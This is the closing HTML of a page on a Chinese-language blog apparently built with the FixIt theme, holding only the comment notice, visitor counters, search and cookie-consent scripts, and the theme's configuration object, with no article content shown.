          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
        </noscript></div></article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script src="/js/theme.min.js" defer></script></body>
</html>
